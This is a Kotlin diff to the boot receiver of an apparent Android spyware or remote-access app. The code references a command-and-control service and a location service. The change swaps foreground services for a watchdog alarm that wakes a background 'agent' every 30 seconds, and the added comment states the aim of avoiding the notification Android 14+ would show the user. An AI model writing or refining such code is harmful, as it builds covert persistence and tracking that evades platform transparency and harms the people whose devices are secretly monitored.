@@ -4,28 +4,25 @@ import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.util.Log
-import com.sp.core.services.C2Service
-import com.sp.core.services.LocationService
+import com.sp.core.agent.AgentWorker
+import com.sp.watchdog.WatchdogAlarm
 
 /**
- * Boot receiver. The services are only *requested* here - on Android 12+
- * a foreground service may not be started from a background context, so the
- * start is attempted and a failure is ignored. The watchdog picks the
- * services up as soon as the device is unlocked.
+ * Boot receiver.
+ *
+ * No foreground service is started here - on Android 12+ that is not even
+ * allowed from a background context, and on Android 14+ it would show a
+ * notification. The watchdog alarm takes over: it wakes the agent every
+ * 30 seconds and the agent does the work in a background thread.
  */
 class BootReceiver : BroadcastReceiver() {
     override fun onReceive(ctx: Context, intent: Intent) {
-        try {
-            val c2 = Intent(ctx, C2Service::class.java)
-            ctx.startForegroundService(c2)
-        } catch (t: Throwable) {
-            Log.i("BootReceiver", "c2 deferred: ${t.message}")
+        val app = ctx.applicationContext
+        try { WatchdogAlarm.arm(app) } catch (t: Throwable) {
+            Log.i("BootReceiver", "alarm deferred: ${t.message}")
         }
-        try {
-            val loc = Intent(ctx, LocationService::class.java)
-            ctx.startForegroundService(loc)
-        } catch (t: Throwable) {
-            Log.i("BootReceiver", "loc deferred: ${t.message}")
-        }
+        Thread {
+            try { AgentWorker.tick(app, force = true) } catch (_: Throwable) {}
+        }.start()
     }
 }
